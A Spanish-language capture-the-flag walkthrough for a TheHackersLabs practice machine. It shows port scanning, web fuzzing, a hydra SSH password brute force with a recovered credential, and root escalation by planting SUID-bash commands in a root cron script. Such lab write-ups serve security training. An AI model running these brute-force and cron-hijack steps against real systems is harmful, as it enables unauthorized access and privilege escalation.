# CTF Writeup: CasaPaco (TheHackersLabs)

## 1. Fase de Reconocimiento y Enumeración (Reconnaissance)

### Escaneo de Puertos de Rango Completo
Se ejecuta un escaneo sigiloso TCP SYN sobre los 65535 puertos del host objetivo `192.168.0.6` deshabilitando el descubrimiento de hosts (`-Pn`).

```bash
sudo nmap -p- --open -sS -Pn -min-rate 5000 192.168.0.6
```

**Resultado:**
*   **Port 22/tcp**: SSH abierto.
*   **Port 80/tcp**: HTTP abierto.
*   **Platform**: Oracle VirtualBox virtual NIC.

### Detección de Servicios y Fingerprinting de Versiones
Targeting específico sobre los vectores expuestos para extraer banners y software en ejecución:

```bash
nmap -p 22,80 -sCV 192.168.0.6
```

*   **22/tcp**: `OpenSSH 9.2p1 Debian 2+deb12u4` (Protocol 2.0).
*   **80/tcp**: `Apache httpd 2.4.62`. El servidor web responde con un código de redirección hacia el dominio virtual local `http://casapaco.thl`.

---

## 2. Intrusión y Explotación (Weaponization & Foothold)

### Manipulación de DNS Local
Para resolver el redireccionamiento HTTP, se inyecta el dominio detectado en el archivo de resolución local:

```bash
echo "192.168.0.6 casapaco.thl" | sudo tee -a /etc/hosts
```

### Fuzzing de Directorios Web
Búsqueda de vectores de entrada ocultos mediante técnicas de fuerza bruta posicional con `wfuzz`:

```bash
wfuzz --hc 404,403 -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt http://casapaco.thl/FUZZ
```

**Estructura descubierta:**
*   `/static` (HTTP 301)
*   `/index.html` (HTTP 200)

### Ataque de Fuerza Bruta sobre Servicio SSH
Al no encontrar subdirectorios críticos explotables en el servicio web, se auditan las credenciales de SSH utilizando el diccionario `rockyou.txt` contra el posible usuario objetivo `pacogerente`:

```bash
hydra -l pacogerente -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.6
```

**Credenciales Comprometidas:**
*   **Usuario:** `pacogerente`
*   **Contraseña:** `dipset1`

### Evasión de Restricción Criptográfica en Cliente SSH
Al intentar el secuestro de sesión, el cliente local aborta la conexión debido a un conflicto de llaves (`Host key verification failed`). Se purga el hash mitigando el bloqueo de seguridad:

```bash
ssh-keygen -f '/home/predator/.ssh/known_hosts' -R '192.168.0.6'
ssh pacogerente@192.168.0.6
```

**Foothold Exitoso:** Acceso al sistema como el usuario de bajos privilegios `pacogerente`. Captura de la primera flag en `user.txt`.

---

## 3. Escalada de Privilegios (Privilege Escalation)

### Vector de Ataque: Tareas Programadas (Cron Jobs)
Inspección de las configuraciones globales de automatización en busca de procesos con permisos asimétricos:

```bash
ls -l /etc/cron.d/
```

Se detecta un archivo inusual y sospechoso denominado `vuln_cron`. Este cron job ejecuta de manera recurrente a intervalos regulares como el usuario `root` un script de shell ubicado en el directorio raíz de `pacogerente`: `/home/pacogerente/fabada.sh`.

## IMPORTANTE PSPY64
Utilidad para para monitorizar las tareas recurrentes del sistema (DEBEMOS PONERLE PERMISOS DE EJECUCION)
```bash
scp pspy64 pacogerente@casapaco.thl:/home/pacogerente/pspy64
```
### Modificación del Vector de Ejecución
Aprovechando que el script `fabada.sh` está bajo el control total del usuario actual, se edita su flujo para generar una persistencia con permisos administrativos.

**Contenido de `fabada.sh` modificado:**

OP1:
```bash
#!/bin/bash
# KALETH
chmod u+s /bin/bash
```

OP2:
```bash
#!/bin/bash
# KALETH
cp /bin/bash /tmp/shell4
chmod +xs /tmp/shell4
```

El script copia el binario nativo de Bash al directorio `/tmp` y le asigna privilegios especiales de ejecución (**SUID/SGID**).

### Ejecución del Exploit Local
Una vez que el demonio `cron` procesa la tarea programada con los privilegios heredados de `root`, se valida la creación del binario alternativo con su flag de SUID activa:

```bash
ls -l /tmp/shell4
# Salida esperada: -rwsr-sr-x 1 root root ... /tmp/shell4
```

Se ejecuta el binario preservando los privilegios efectivos del propietario (`-p` / *privileged mode*):

```bash
/tmp/shell4 -p
```

**Resultado:**
```text
uid=1001(pacogerente) gid=1001(pacogerente) euid=0(root) egid=0(root)
whoami -> root
```

---

## 4. Post-Explotación (Loot)
*   **User Flag:** Localizada con éxito en `/home/pacogerente/user.txt`.
*   **Root Flag:** Capturada de forma exitosa tras acceder al directorio restringido del administrador en `/root/root.txt`.
